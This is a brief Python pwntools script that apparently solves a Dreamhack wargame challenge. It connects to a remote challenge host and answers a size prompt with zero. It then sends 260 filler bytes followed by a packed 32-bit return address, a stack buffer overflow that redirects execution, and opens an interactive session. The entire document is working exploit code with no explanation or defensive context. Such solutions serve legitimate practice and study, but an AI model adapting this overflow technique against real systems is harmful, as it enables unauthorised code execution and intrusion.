from pwn import *
r = remote("host3.dreamhack.games", 24280)
d = r.recvuntil('Size:')
print(d.decode('utf-8'))
r.sendline("0")
d = r.recvuntil('Data:')
print(d.decode('utf-8'))
p = p32(0x08048659)
r.send(b"a"*260+p)
r.interactive()